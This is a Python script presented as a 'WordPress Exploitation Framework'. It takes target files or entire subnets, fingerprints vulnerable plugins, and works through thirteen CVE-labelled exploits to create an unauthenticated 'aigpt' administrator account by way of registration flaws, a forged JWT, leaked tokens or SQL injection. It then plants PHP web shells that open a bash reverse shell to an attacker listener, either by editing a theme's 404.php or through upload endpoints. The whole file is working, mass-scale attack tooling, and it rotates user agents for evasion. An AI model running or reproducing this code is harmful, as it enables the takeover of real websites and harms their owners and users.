#!/usr/bin/env python3
"""
AiGPT WordPress Exploitation Framework
Multi‑vector unauthenticated admin creation → reverse shell.
Authorised testing only.
"""

import argparse, hashlib, json, logging, queue, re, secrets, sys, threading, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from enum import Enum, auto
from ipaddress import ip_network
from typing import Callable, Dict, List, Tuple
from urllib.parse import urljoin

import requests
from requests.exceptions import RequestException

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

TARGET_QUEUE = queue.Queue()
SUCCESSFUL_HOSTS: List[str] = []
FINGERPRINT_CACHE: Dict[str, Dict[str, bool]] = {}
CACHE_LOCK = threading.Lock()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout), logging.FileHandler("aigpt.log")],
)
logger = logging.getLogger("aigpt")


class VectorType(Enum):
    DIRECT_ADMIN = auto()
    TOKEN_HIJACK = auto()
    SQL_EXEC = auto()
    FILE_UPLOAD = auto()


@dataclass
class ExploitVector:
    cve: str
    name: str
    plugin_slug: str
    vector_type: VectorType
    cvss: float
    priority: int
    fingerprints: List[str]
    exploit_fn: Callable[..., bool]


def rand_ua() -> str:
    idx = int(hashlib.md5(str(time.time()).encode()).hexdigest(), 16) % len(USER_AGENTS)
    return USER_AGENTS[idx]


def wp_phpass(password: str) -> str:
    itoa64 = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    iteration_count_log2 = 8
    count = 1 << iteration_count_log2
    salt = "".join(itoa64[secrets.randbelow(64)] for _ in range(8))
    h = hashlib.md5((salt + password).encode()).digest()
    for _ in range(count - 1):
        h = hashlib.md5(h + password.encode()).digest()
    output = "$P$" + itoa64[iteration_count_log2] + salt
    i = 0
    while True:
        value = h[i] & 0xFF
        i += 1
        output += itoa64[value & 0x3F]
        if i < 16:
            value |= (h[i] & 0xFF) << 8
        output += itoa64[(value >> 6) & 0x3F]
        if i >= 16:
            break
        i += 1
        if i < 16:
            value = h[i] & 0xFF
        output += itoa64[(value >> 12) & 0x3F]
        i += 1
    return output


def is_wordpress(target: str) -> bool:
    base = target.rstrip("/")
    try:
        r = requests.get(base + "/wp-login.php", timeout=5, allow_redirects=True)
        if r.status_code == 200 and ("wp-submit" in r.text or "wp-login" in r.url):
            return True
    except RequestException:
        pass
    try:
        r2 = requests.get(base + "/wp-admin/images/w-logo-blue.png", timeout=5)
        if r2.status_code == 200:
            return True
    except RequestException:
        pass
    return False


PLUGIN_PROBES = {
    "suretriggers":       "/wp-json/sure-triggers/v1/",
    "king-addons":        "/wp-content/plugins/king-addons/",
    "simple-user-reg":    "/wp-content/plugins/simple-user-registration/",
    "opal-estate":        "/wp-content/plugins/opal-estate-pro/",
    "truelysell":         "/wp-content/plugins/truelysell-core/",
    "ai-engine":          "/wp-json/ai-engine/v1/me",
    "pie-register":       "/wp-content/plugins/pie-register/",
    "frontend-admin":     "/wp-content/plugins/acf-frontend-form-element/",
    "tax-service-hdm":    "/wp-content/plugins/tax-service-electronic-hdm/",
    "woo-dynamic-pricing": "/wp-content/plugins/wc-designer-pro/",
    "ninja-forms-uploads": "/wp-content/plugins/ninja-forms-uploads/",
    "user-reg-adv-fields": "/wp-content/plugins/user-registration-advanced-fields/",
}


def fingerprint_plugins(base: str) -> Dict[str, bool]:
    results = {}
    def probe(plugin, path):
        try:
            r = requests.get(base + path, timeout=6, allow_redirects=False)
            return plugin, r.status_code != 404
        except RequestException:
            return plugin, False
    with ThreadPoolExecutor(max_workers=10) as ex:
        fs = {ex.submit(probe, p, pt): p for p, pt in PLUGIN_PROBES.items()}
        for future in as_completed(fs):
            p, found = future.result()
            results[p] = found
    return results


def cached_fingerprint(url: str) -> Dict[str, bool]:
    with CACHE_LOCK:
        if url not in FINGERPRINT_CACHE:
            FINGERPRINT_CACHE[url] = fingerprint_plugins(url)
        return FINGERPRINT_CACHE[url]


def upload_shell_via_theme(session, base: str, lhost: str, lport: int) -> bool:
    try:
        r = session.get(base + "/wp-admin/themes.php", timeout=10)
        m = re.search(r'<h2 class="theme-name">(.*?)</h2>', r.text)
        if not m:
            m = re.search(r'Theme Name:\s*(.*?)\s*</td>', r.text)
        if not m:
            for t in ["twentytwentyfive","twentytwentyfour","twentytwentythree",
                      "twentytwentytwo","twentytwentyone","twentytwenty"]:
                r2 = session.get(base + f"/wp-admin/theme-editor.php?theme={t}&file=404.php", timeout=10)
                if "404.php" in r2.text and "File not found" not in r2.text:
                    theme = t
                    break
            else:
                logger.error(f"[{base}] Cannot identify theme")
                return False
        else:
            theme = m.group(1).strip().lower().replace(" ", "")
    except RequestException as e:
        logger.error(f"[{base}] Theme detection error: {e}")
        return False

    logger.info(f"[{base}] Theme: {theme}")
    editor_url = f"{base}/wp-admin/theme-editor.php?theme={theme}&file=404.php"
    try:
        r = session.get(editor_url, timeout=10)
        nm = re.search(r'<input type="hidden" name="nonce" value="([^"]+)"', r.text)
        if not nm:
            nm = re.search(r'"nonce":"([^"]+)"', r.text)
        if not nm:
            logger.error(f"[{base}] Nonce not found")
            return False
        nonce = nm.group(1)
    except RequestException as e:
        logger.error(f"[{base}] Nonce fetch error: {e}")
        return False

    shell = (f"<?php\n"
             f"exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\");\n"
             f"// aigpt\n?>")
    payload = {
        "nonce": nonce,
        "_wp_http_referer": f"/wp-admin/theme-editor.php?theme={theme}&file=404.php",
        "newcontent": shell,
        "action": "edit-theme-plugin-file",
        "file": f"{theme}/404.php",
    }
    try:
        r = session.post(base + "/wp-admin/admin-ajax.php", data=payload, timeout=10)
        if "File edited successfully" not in r.text:
            logger.error(f"[{base}] File edit failed")
            return False
    except RequestException as e:
        logger.error(f"[{base}] Shell injection error: {e}")
        return False

    trigger_url = f"{base}/wp-content/themes/{theme}/404.php"
    try:
        requests.get(trigger_url, timeout=5)
        logger.info(f"[{base}] Shell triggered")
        return True
    except RequestException:
        logger.info(f"[{base}] Shell triggered (no response expected)")
        return True


def login_and_shell(base: str, user: str, pwd: str, lhost: str, lport: int) -> bool:
    s = requests.Session()
    s.headers.update({"User-Agent": rand_ua()})
    try:
        r = s.post(f"{base}/wp-login.php", data={
            "log": user, "pwd": pwd, "wp-submit": "Log In", "testcookie": "1"
        }, timeout=10, allow_redirects=True)
        if any("wordpress_logged_in" in c.name for c in s.cookies):
            logger.info(f"[{base}] Logged in as {user}")
            return upload_shell_via_theme(s, base, lhost, lport)
        logger.error(f"[{base}] Login failed for {user}")
        return False
    except RequestException as e:
        logger.error(f"[{base}] Login error: {e}")
        return False


def exploit_suretriggers(base: str, lhost: str, lport: int) -> bool:
    api = urljoin(base.rstrip("/")+"/", "wp-json/sure-triggers/v1/automation/action")
    try:
        r = requests.post(api, json={"action":"create_user","username":"aigpt",
                           "password":"aigpt@1337","email":"aigpt@test.local"},
                          headers={"User-Agent":rand_ua(),"Content-Type":"application/json"}, timeout=10)
        if r.status_code==200 and '"success":true' in r.text.lower():
            logger.info(f"[{base}] CVE-2025-3102 admin created")
            return login_and_shell(base,"aigpt","aigpt@1337",lhost,lport)
    except RequestException:
        pass
    return False


def exploit_king_addons(base: str, lhost: str, lport: int) -> bool:
    ajax = urljoin(base.rstrip("/")+"/", "wp-admin/admin-ajax.php")
    try:
        r = requests.post(ajax, data={
            "action":"king_addons_user_register","user_role":"administrator",
            "user_login":"aigpt","user_email":"aigpt@test.local","user_pass":"aigpt@1337"
        }, headers={"User-Agent":rand_ua()}, timeout=10)
        if "success" in r.text.lower() or "administrator" in r.text.lower():
            logger.info(f"[{base}] CVE-2025-8489 admin created")
            return login_and_shell(base,"aigpt","aigpt@1337",lhost,lport)
    except RequestException:
        pass
    return False


def exploit_simple_user_reg(base: str, lhost: str, lport: int) -> bool:
    ajax = urljoin(base.rstrip("/")+"/", "wp-admin/admin-ajax.php")
    for path in ["/wpr/default-registration/","/register/","/signup/"]:
        try:
            form_url = base + path
            r = requests.get(form_url, headers={"User-Agent":rand_ua()}, timeout=8)
            nm = re.search(r'"nonce":"([^"]+)"', r.text) or re.search(r'name="nonce"[^>]+value="([^"]+)"', r.text)
            if not nm:
                continue
            payload = {
                "action":"user_registration_user_form_submit","nonce":nm.group(1),
                "form_id":"76","user_login":"aigpt","user_email":"aigpt@test.local",
                "user_pass":"aigpt@1337","user_role":"administrator"
            }
            r2 = requests.post(ajax, data=payload, headers={"User-Agent":rand_ua()}, timeout=10)
            if "success" in r2.text.lower():
                logger.info(f"[{base}] CVE-2025-4334 admin created")
                return login_and_shell(base,"aigpt","aigpt@1337",lhost,lport)
        except RequestException:
            continue
    return False


def exploit_opal_estate(base: str, lhost: str, lport: int) -> bool:
    ajax = urljoin(base.rstrip("/")+"/", "wp-admin/admin-ajax.php")
    try:
        r = requests.post(ajax, data={
            "action":"opalestate_register","user_login":"aigpt",
            "user_email":"aigpt@test.local","user_pass":"aigpt@1337","role":"administrator"
        }, headers={"User-Agent":rand_ua()}, timeout=10)
        if "success" in r.text.lower():
            logger.info(f"[{base}] CVE-2025-6934 admin created")
            return login_and_shell(base,"aigpt","aigpt@1337",lhost,lport)
    except RequestException:
        pass
    return False


def exploit_truelysell(base: str, lhost: str, lport: int) -> bool:
    ajax = urljoin(base.rstrip("/")+"/", "wp-admin/admin-ajax.php")
    try:
        r = requests.post(ajax, data={
            "action":"truelysell_register","user_role":"administrator",
            "user_login":"aigpt","user_email":"aigpt@test.local","user_pass":"aigpt@1337"
        }, headers={"User-Agent":rand_ua()}, timeout=10)
        if r.status_code==200 and ("administrator" in r.text.lower()):
            logger.info(f"[{base}] CVE-2025-8572 admin created")
            return login_and_shell(base,"aigpt","aigpt@1337",lhost,lport)
    except RequestException:
        pass
    return False


def exploit_mobile_builder(base: str, lhost: str, lport: int) -> bool:
    try:
        import jwt as pyjwt
    except ImportError:
        return False
    token = pyjwt.encode({"user_id":1,"exp":int(time.time())+3600},"secret",algorithm="HS256")
    headers = {"Authorization":f"Bearer {token}","User-Agent":rand_ua()}
    create = urljoin(base.rstrip("/")+"/","wp-json/wp/v2/users")
    try:
        r = requests.post(create, json={
            "username":"aigpt","password":"aigpt@1337","email":"aigpt@test.local","roles":["administrator"]
        }, headers=headers, timeout=10)
        if r.status_code in (200,201) or "id" in r.text:
            logger.info(f"[{base}] CVE-2025-68860 admin via JWT")
            return login_and_shell(base,"aigpt","aigpt@1337",lhost,lport)
    except RequestException:
        pass
    return False


def exploit_ai_engine(base: str, lhost: str, lport: int) -> bool:
    tok_url = urljoin(base.rstrip("/")+"/","wp-json/ai-engine/v1/me")
    try:
        r = requests.get(tok_url, headers={"User-Agent":rand_ua()}, timeout=10)
        data = r.json() if r.status_code==200 else {}
        token = data.get("token") or data.get("bearer") or data.get("access_token")
        if not token:
            return False
        logger.info(f"[{base}] AI Engine token: {token[:20]}…")
        create = urljoin(base.rstrip("/")+"/","wp-json/wp/v2/users")
        r2 = requests.post(create, json={
            "username":"aigpt","email":"aigpt@test.local","password":"aigpt@1337","roles":["administrator"]
        }, headers={"Authorization":f"Bearer {token}","User-Agent":rand_ua()}, timeout=10)
        if r2.status_code==201 or "id" in r2.text:
            logger.info(f"[{base}] CVE-2025-11749 admin created")
            return login_and_shell(base,"aigpt","aigpt@1337",lhost,lport)
    except Exception:
        pass
    return False


def exploit_pie_register(base: str, lhost: str, lport: int) -> bool:
    login_url = urljoin(base.rstrip("/")+"/","wp-login.php")
    try:
        s = requests.Session()
        s.headers.update({"User-Agent":rand_ua()})
        r = s.post(login_url, data={"log":"admin","pwd":"","pie_register":"1","wp-submit":"Log In"},
                   timeout=10, allow_redirects=False)
        if any("wordpress_logged_in" in c.name for c in s.cookies):
            logger.info(f"[{base}] CVE-2025-34077 session hijacked")
            return upload_shell_via_theme(s, base, lhost, lport)
    except RequestException:
        pass
    return False


def exploit_frontend_admin(base: str, lhost: str, lport: int) -> bool:
    ajax = urljoin(base.rstrip("/")+"/","wp-admin/admin-ajax.php")
    for path in ["/register/","/registration/","/signup/","/account/","/"]:
        try:
            r = requests.get(base+path, headers={"User-Agent":rand_ua()}, timeout=8)
            acf_n = re.search(r'"acf_nonce":"([^"]+)"', r.text)
            acf_f = re.search(r'"acf_form":"([^"]+)"', r.text)
            if acf_n and acf_f:
                payload = {
                    "action":"frontend_admin/form_submit","_acf_nonce":acf_n.group(1),
                    "_acf_form":acf_f.group(1),
                    "acff[user][field_username]":"aigpt",
                    "acff[user][field_email]":"aigpt@test.local",
                    "acff[user][field_password]":"aigpt@1337",
                    "acff[user][field_role]":"administrator"
                }
                r2 = requests.post(ajax, data=payload, headers={"User-Agent":rand_ua()}, timeout=10)
                if '"success":true' in r2.text.lower():
                    logger.info(f"[{base}] CVE-2025-13342 admin created")
                    return login_and_shell(base,"aigpt","aigpt@1337",lhost,lport)
        except RequestException:
            continue
    return False


def exploit_tax_hdm(base: str, lhost: str, lport: int) -> bool:
    ajax = urljoin(base.rstrip("/")+"/","wp-admin/admin-ajax.php")
    hdrs = {"User-Agent":rand_ua(), "Content-Type":"application/x-www-form-urlencoded"}
    actions = ["hdm_import_sql","import_sql","tax_hdm_import"]
    prefix = "wp_"
    for act in actions:
        try:
            r = requests.post(ajax, data={"action":act,"sql":"SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME LIKE '%\\\\_users'"}, headers=hdrs, timeout=10)
            m = re.search(r'["\']?(\w+_users)["\']?', r.text)
            if m and m.group(1).endswith("_users"):
                prefix = m.group(1).replace("_users","")+"_"
                break
        except RequestException:
            continue
    ut, mt = prefix+"users", prefix+"usermeta"
    ph = wp_phpass("aigpt@1337")
    sql_user = (f"INSERT INTO {ut} (user_login,user_pass,user_nicename,user_email,"
                f"user_url,user_registered,user_status,display_name) "
                f"VALUES ('aigpt','{ph}','aigpt','aigpt@test.local',"
                f"'http://127.0.0.1:8000','2024-04-30 16:26:43',0,'aigpt')")
    for act in actions:
        try:
            r = requests.post(ajax, data={"action":act,"sql":sql_user}, headers=hdrs, timeout=10)
            if "success" in r.text.lower() or ut in r.text.lower():
                sql_role = (f"INSERT INTO {mt} (user_id,meta_key,meta_value) "
                            f"VALUES ((SELECT ID FROM {ut} WHERE user_login='aigpt'),"
                            f"'wp_capabilities','a:1:{{s:13:\"administrator\";s:1:\"1\";}}')")
                requests.post(ajax, data={"action":act,"sql":sql_role}, headers=hdrs, timeout=10)
                logger.info(f"[{base}] CVE-2025-12061 admin via SQL")
                return login_and_shell(base,"aigpt","aigpt@1337",lhost,lport)
        except RequestException:
            continue
    return False


def exploit_woo_direct_upload(base: str, lhost: str, lport: int) -> bool:
    ajax = urljoin(base.rstrip("/")+"/","wp-admin/admin-ajax.php")
    shell = f"<?php\nexec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\");?>"
    try:
        r = requests.post(ajax, data={"action":"wcdp_save_canvas_design_ajax","design_data":shell,"filename":"aigpt_shell.php"},
                          headers={"User-Agent":rand_ua()}, timeout=10)
        check = f"{base}/wp-content/uploads/aigpt_shell.php"
        if requests.get(check, timeout=5).status_code==200:
            logger.info(f"[{base}] CVE-2025-6440 direct shell")
            SUCCESSFUL_HOSTS.append(base)
            return True
    except RequestException:
        pass
    return False


def exploit_ninja_forms_upload(base: str, lhost: str, lport: int) -> bool:
    ajax = urljoin(base.rstrip("/")+"/","wp-admin/admin-ajax.php")
    shell = f"<?php\nexec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\");?>"
    files = {"file":("aigpt_shell.php",shell,"application/x-php")}
    try:
        r = requests.post(ajax, data={"action":"nf_fu_upload"}, files=files,
                          headers={"User-Agent":rand_ua()}, timeout=10)
        if "success" in r.text.lower():
            for month in [f"{m:02d}" for m in range(1,13)]:
                check = f"{base}/wp-content/uploads/ninja-forms/{month}/aigpt_shell.php"
                try:
                    if requests.get(check, timeout=5).status_code==200:
                        logger.info(f"[{base}] CVE-2026-0740 shell at {check}")
                        SUCCESSFUL_HOSTS.append(base)
                        return True
                except RequestException:
                    continue
    except RequestException:
        pass
    return False


def exploit_user_reg_adv_upload(base: str, lhost: str, lport: int) -> bool:
    ajax = urljoin(base.rstrip("/")+"/","wp-admin/admin-ajax.php")
    shell = f"<?php\nexec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\");?>"
    files = {"file":("aigpt_shell.php",shell,"application/x-php")}
    try:
        r = requests.post(ajax, data={"action":"uraf_method_upload"}, files=files,
                          headers={"User-Agent":rand_ua()}, timeout=10)
        check = f"{base}/wp-content/uploads/user_registration_advanced_fields/aigpt_shell.php"
        if requests.get(check, timeout=5).status_code==200:
            logger.info(f"[{base}] CVE-2026-4882 shell uploaded")
            SUCCESSFUL_HOSTS.append(base)
            return True
    except RequestException:
        pass
    return False


VECTORS = [
    ExploitVector("CVE-2025-3102","SureTriggers","suretriggers",VectorType.DIRECT_ADMIN,9.8,95,
                  ["/wp-json/sure-triggers/v1/"], exploit_suretriggers),
    ExploitVector("CVE-2025-8489","King Addons","king-addons",VectorType.DIRECT_ADMIN,9.8,94,
                  ["/wp-content/plugins/king-addons/"], exploit_king_addons),
    ExploitVector("CVE-2025-4334","Simple User Reg","simple-user-reg",VectorType.DIRECT_ADMIN,9.8,90,
                  ["/wp-content/plugins/simple-user-registration/"], exploit_simple_user_reg),
    ExploitVector("CVE-2025-6934","Opal Estate","opal-estate",VectorType.DIRECT_ADMIN,9.8,88,
                  ["/wp-content/plugins/opal-estate-pro/"], exploit_opal_estate),
    ExploitVector("CVE-2025-8572","Truelysell","truelysell",VectorType.DIRECT_ADMIN,9.8,86,
                  ["/wp-content/plugins/truelysell-core/"], exploit_truelysell),
    ExploitVector("CVE-2025-68860","Mobile Builder","mobile-builder",VectorType.DIRECT_ADMIN,9.8,84,
                  ["/wp-content/plugins/mobile-builder/"], exploit_mobile_builder),
    ExploitVector("CVE-2025-11749","AI Engine","ai-engine",VectorType.TOKEN_HIJACK,9.8,78,
                  ["/wp-json/ai-engine/v1/me"], exploit_ai_engine),
    ExploitVector("CVE-2025-34077","Pie Register","pie-register",VectorType.TOKEN_HIJACK,9.8,76,
                  ["/wp-content/plugins/pie-register/"], exploit_pie_register),
    ExploitVector("CVE-2025-13342","Frontend Admin","frontend-admin",VectorType.DIRECT_ADMIN,9.8,74,
                  ["/wp-content/plugins/acf-frontend-form-element/"], exploit_frontend_admin),
    ExploitVector("CVE-2025-12061","Tax Service HDM","tax-service-hdm",VectorType.SQL_EXEC,8.6,70,
                  ["/wp-content/plugins/tax-service-electronic-hdm/"], exploit_tax_hdm),
    ExploitVector("CVE-2025-6440","WooCommerce Pricing","woo-dynamic-pricing",VectorType.FILE_UPLOAD,9.8,65,
                  ["/wp-content/plugins/wc-designer-pro/"], exploit_woo_direct_upload),
    ExploitVector("CVE-2026-0740","Ninja Forms Uploads","ninja-forms-uploads",VectorType.FILE_UPLOAD,9.8,63,
                  ["/wp-content/plugins/ninja-forms-uploads/"], exploit_ninja_forms_upload),
    ExploitVector("CVE-2026-4882","User Reg Adv Fields","user-reg-adv-fields",VectorType.FILE_UPLOAD,9.8,61,
                  ["/wp-content/plugins/user-registration-advanced-fields/"], exploit_user_reg_adv_upload),
]


def select_vectors(fingerprint: Dict[str, bool]) -> List[ExploitVector]:
    scored = []
    for vec in VECTORS:
        s = vec.priority
        if fingerprint.get(vec.plugin_slug):
            s += 100
        if vec.vector_type == VectorType.FILE_UPLOAD:
            s += 5
        scored.append((s, vec))
    scored.sort(key=lambda x: x[0], reverse=True)
    return [v for _, v in scored]


def process_target(target: str, lhost: str, lport: int):
    target = target.rstrip("/")
    if not is_wordpress(target):
        logger.info(f"[{target}] Not WordPress, skip")
        return
    fp = cached_fingerprint(target)
    detected = [k for k,v in fp.items() if v]
    logger.info(f"[{target}] Fingerprint: {detected if detected else 'none'}")
    vectors = select_vectors(fp)
    logger.info(f"[{target}] Vector order: {', '.join(v.name for v in vectors[:5])}")
    for vec in vectors:
        logger.info(f"[{target}] Trying {vec.cve} ({vec.name})")
        try:
            if vec.exploit_fn(target, lhost, lport):
                logger.info(f"[{target}] ✓ Success via {vec.cve}")
                if target not in SUCCESSFUL_HOSTS:
                    SUCCESSFUL_HOSTS.append(target)
                return
        except Exception as e:
            logger.error(f"[{target}] {vec.cve} exception: {e}")
    logger.info(f"[{target}] No vector succeeded")


def worker(delay: float, lhost: str, lport: int):
    while True:
        tgt = TARGET_QUEUE.get()
        try:
            process_target(tgt, lhost, lport)
        except Exception as e:
            logger.error(f"[{tgt}] Fatal error: {e}")
        finally:
            TARGET_QUEUE.task_done()
            time.sleep(delay)


def load_targets_from_file(path: str):
    try:
        with open(path) as f:
            for line in f:
                url = line.strip()
                if url.startswith(("http://","https://")):
                    TARGET_QUEUE.put(url)
    except IOError as e:
        logger.error(f"File error: {e}")


def load_targets_from_subnet(cidr: str):
    try:
        net = ip_network(cidr)
    except ValueError as e:
        logger.error(f"Invalid subnet: {e}")
        return
    for ip in net.hosts():
        for scheme in ("http","https"):
            TARGET_QUEUE.put(f"{scheme}://{ip}")
            TARGET_QUEUE.put(f"{scheme}://{ip}/wordpress")


def main():
    print("AiGPT WordPress Exploitation Framework")
    parser = argparse.ArgumentParser(description="AiGPT – WordPress multi‑vector exploitation")
    parser.add_argument("--lhost", default="127.0.0.1", help="Reverse shell listener IP")
    parser.add_argument("--lport", type=int, default=1414, help="Reverse shell listener port")
    parser.add_argument("--threads", type=int, default=10, help="Worker threads")
    parser.add_argument("--targets", help="File with target URLs")
    parser.add_argument("--subnet", help="CIDR subnet")
    parser.add_argument("--delay", type=float, default=0.5)
    args = parser.parse_args()

    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(args.delay, args.lhost, args.lport), daemon=True)
        t.start()

    if args.targets:
        load_targets_from_file(args.targets)
    elif args.subnet:
        load_targets_from_subnet(args.subnet)
    else:
        logger.error("Specify --targets or --subnet")
        sys.exit(1)

    TARGET_QUEUE.join()
    logger.info(f"Finished. Successful: {len(SUCCESSFUL_HOSTS)} host(s)")
    for host in SUCCESSFUL_HOSTS:
        logger.info(f"  ✓ {host}")


if __name__ == "__main__":
    main()
